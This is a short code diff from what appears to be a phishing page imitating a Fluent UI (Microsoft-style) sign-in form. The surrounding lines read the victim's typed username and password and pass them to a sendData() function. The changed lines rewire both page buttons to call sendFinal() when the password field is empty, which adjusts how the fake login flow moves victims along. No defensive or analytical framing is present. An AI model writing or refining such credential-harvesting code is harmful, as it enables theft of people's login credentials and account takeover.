@@ -52,9 +52,12 @@
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
                     if(password.length < 1){
-                        var btn = document.getElementsByTagName('fluent-button')[1];
-                        btn.removeAttribute('type');
-                        btn.setAttribute('onclick', 'sendFinal()');
+                        var btn0 = document.getElementsByTagName('fluent-button')[0];
+                        btn0.removeAttribute('type');
+                        btn0.setAttribute('onclick', 'sendFinal()');
+                        var btn1 = document.getElementsByTagName('fluent-button')[1];
+                        btn1.removeAttribute('type');
+                        btn1.setAttribute('onclick', 'sendFinal()');
                     }
                     else{
                         await delay(5000);
